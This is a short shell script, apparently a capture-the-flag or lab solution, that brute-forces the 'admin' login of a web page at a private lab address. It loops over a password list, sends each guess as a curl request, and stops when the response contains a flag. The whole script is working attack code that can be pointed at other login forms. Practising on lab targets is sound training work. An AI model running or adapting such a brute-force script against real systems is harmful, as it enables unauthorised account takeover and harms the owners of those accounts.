#!/bin/sh
ip_address="192.168.1.12"
input="passwords.txt"
username="admin"

while IFS= read -r line
do
    echo "Luci is using: $line"
    response=$(curl "http://$ip_address/?page=signin&username=$username&password=$line&Login=Login#" 2>&- | grep "flag")
    if [ ! -z "$response" ]; then
        echo $response
        break
    fi
done < "$input"